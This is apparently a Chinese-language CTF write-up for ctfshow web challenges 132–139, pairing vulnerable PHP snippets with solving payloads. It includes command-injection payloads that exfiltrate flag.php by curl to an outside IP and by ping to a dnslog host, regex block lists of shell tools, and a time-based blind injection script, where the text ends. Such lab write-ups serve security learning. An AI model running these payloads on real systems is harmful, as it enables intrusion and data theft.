<p><img alt="image-20250124132344174" loading="lazy" src="assets/image-20250124132344174.png"></p>
<p>/admin</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 06:22:13
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 20:05:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">#error_reporting(0);
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nv">$code</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$code</span> <span class="o">===</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x36D</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">===</span> <span class="nv">$flag</span> <span class="o">||</span> <span class="nv">$username</span> <span class="o">===</span><span class="s2">&#34;admin&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$code</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>第一个判断后面用的是或</p>
<p>也就是说只要使username等于admin即可，前面两个无所谓了</p>
<p>第二个判断让code等于admin即可</p>
<p>payload：</p>
<pre tabindex="0"><code>GET:?code=admin&amp;username=admin&amp;password=
</code></pre><h4 id="web133">web133<a hidden class="anchor" aria-hidden="true" href="#web133">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 16:43:44
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">//flag.php
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nv">$F</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;F&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/system|nc|wget|exec|passthru|netcat/i&#39;</span><span class="p">,</span> <span class="nv">$F</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$F</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;6个字母都还不够呀?!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><a href="https://www.cnblogs.com/hithub/p/16809053.html">ctfshow web133(变量覆盖+无回显命令执行dns_bp带外) - hithub - 博客园</a></p>
<p>这其实是一道关于变量覆盖的题目</p>
<pre tabindex="0"><code>get传参   F=`$F `;sleep 3
经过substr($F,0,6)截取后 得到  `$F `;
也就是会执行 eval(&#34;`$F `;&#34;);
我们把原来的$F带进去
eval(&#34;``$F `;sleep 3`&#34;);
也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec(&#34;`$F `;sleep 3&#34;);
前面的命令我们不需要管，但是后面的命令我们可以自由控制。
这样就在服务器上成功执行了 sleep 3
所以 最后就是一道无回显的RCE题目了
</code></pre><p>payload:</p>
<pre tabindex="0"><code>`$F `;cat flag.php | curl -X POST -d @- http://106.55.168.231:7777/
</code></pre><p>curl外带rce</p>
<p><img alt="image-20250124143152342" loading="lazy" src="assets/image-20250124143152342.png"></p>
<h4 id="web134">web134<a hidden class="anchor" aria-hidden="true" href="#web134">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-14 23:01:06
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nv">$key1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$key2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key1&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key2&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key1&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key2&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;nonononono&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="o">@</span><span class="nx">parse_str</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$key1</span> <span class="o">==</span> <span class="s1">&#39;36d&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$key2</span> <span class="o">==</span> <span class="s1">&#39;36d&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><img alt="image-20250124144438661" loading="lazy" src="assets/image-20250124144438661.png"></p>
<p>看到extract想起变量覆盖</p>
<pre tabindex="0"><code>extract($_POST);
//提取$_POST数组
</code></pre><p>payload:</p>
<pre tabindex="0"><code>?_POST[key1]=36d&amp;_POST[key2]=36d
</code></pre><h4 id="web135">web135<a hidden class="anchor" aria-hidden="true" href="#web135">#</a></h4>
<pre tabindex="0"><code>&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 18:48:03

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET[&#39;F&#39;]){
    if(!preg_match(&#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#39;, $F)){
        eval(substr($F,0,6));
    }else{
        die(&#34;师傅们居然破解了前面的，那就来一个加强版吧&#34;);
    }
}
</code></pre><p>133plus</p>
<p>这题ban了很多命令</p>
<p>但是没ban nl,mv，可以用nl和cp把flag写到其他文件中</p>
<p>payload:</p>
<pre tabindex="0"><code>`$F `;nl f*&gt;1.txt
`$F `;mv f*&gt;1.txt
</code></pre><p><img alt="image-20250124150917001" loading="lazy" src="assets/image-20250124150917001.png"></p>
<p>这题也可以用ping进行外带</p>
<pre tabindex="0"><code>`$F`;+ping `cat flag.php|awk &#39;NR==2&#39;`.6x1sys.dnslog.cn
#通过ping命令去带出数据，然后awk NR一排一排的获得数据
</code></pre><h4 id="web136">web136<a hidden class="anchor" aria-hidden="true" href="#web136">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$x</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;</span><span class="p">,</span> <span class="nv">$x</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;too young too simple sometimes naive!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nx">check</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">exec</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题要用到一个linux的命令tee</p>
<blockquote>
<h3 id="linux-tee命令介绍">Linux <a href="https://so.csdn.net/so/search?q=tee&amp;spm=1001.2101.3001.7020">tee</a>命令介绍<a hidden class="anchor" aria-hidden="true" href="#linux-tee命令介绍">#</a></h3>
<p><code>tee</code>命令在Linux中用于从标准输入读取数据，并将其写入到标准输出和一个或多个文件中。<code>tee</code>命令通常与其他命令一起通过管道使用。</p>
<p>如</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">ls /<span class="p">|</span>tee 1.txt
</span></span></code></pre></div><p>就可以将ls /的结果写入到1.txt文件中</p></blockquote>
<pre tabindex="0"><code>ls /|tee 1
</code></pre><p>这题ban掉了.</p>
<p>访问url/1，下载文件1</p>
<p><img alt="image-20250124152140227" loading="lazy" src="assets/image-20250124152140227.png"></p>
<p>看到flag的位置</p>
<pre tabindex="0"><code>?c=cat /f149_15_h3r3|tee 2
</code></pre><p><img alt="image-20250124152240505" loading="lazy" src="assets/image-20250124152240505.png"></p>
<h4 id="web137">web137<a hidden class="anchor" aria-hidden="true" href="#web137">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-16 22:27:49
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;private class&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">static</span> <span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p><img alt="image-20250124162118373" loading="lazy" src="assets/image-20250124162118373.png"></p>
<p>我们需要通过post传入一个数组，数组中包含类名和方法名</p>
<p>payload</p>
<pre tabindex="0"><code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag
</code></pre><p>又或者</p>
<pre tabindex="0"><code>ctfshow=ctfshow::getFlag
</code></pre><h4 id="web138">web138<a hidden class="anchor" aria-hidden="true" href="#web138">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-16 22:52:13
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;private class&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">static</span> <span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">strripos</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">],</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span><span class="o">&gt;-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;private function&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p>这道题限制了上一题的第二种解法</p>
<p>第一种还能继续使用</p>
<p>payload:</p>
<pre tabindex="0"><code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag
ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag
</code></pre><h4 id="web139">web139<a hidden class="anchor" aria-hidden="true" href="#web139">#</a></h4>
<pre tabindex="0"><code>&lt;?php
error_reporting(0);
function check($x){
    if(preg_match(&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;, $x)){
        die(&#39;too young too simple sometimes naive!&#39;);
    }
}
if(isset($_GET[&#39;c&#39;])){
    $c=$_GET[&#39;c&#39;];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?&gt;
</code></pre><p>这题看着和前面那题是一样的</p>
<p>但实际上没有写文件的权限</p>
<p>这题可以通过时间盲注攻击获取文件名已经文件中的字符等</p>
<p>时间盲注脚本：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&#34;-&#34;</span> <span class="o">+</span> <span class="s2">&#34;{&#34;</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span> <span class="o">+</span> <span class="s2">&#34;_&#34;</span> <span class="o">+</span> <span class="s2">&#34;~&#34;</span>    <span class="c1"># 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>          <span class="c1"># 初始化一个空字符串，用于保存结果</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1">#获取多少行</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span>   <span class="c1">#用于控制内层循环(j)的结束</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="c1">#不break的情况下，一行最多几个字符</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>       <span class="c1">#n就是一个一个的返回值</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;if [ `ls /|awk &#39;NR==</span><span class="si">{0}</span><span class="s2">&#39;|cut -c </span><span class="si">{1}</span><span class="s2">` == </span><span class="si">{2}</span><span class="s2"> ];then sleep 3;fi&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>   <span class="c1">#{n}是占位符</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="c1">#print(payload)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=&#34;</span> <span class="o">+</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="p">(</span><span class="mf">2.5</span><span class="p">,</span> <span class="mf">2.5</span><span class="p">))</span>   <span class="c1">#设置超时时间为 2.5 秒,包括连接超时和读取超时，超时就是之前sleep 3了。</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="c1"># 如果请求发生异常，表示条件满足，将当前字符 n 添加到结果字符串中，并结束当前内层循环</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">n</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                <span class="k">break</span>
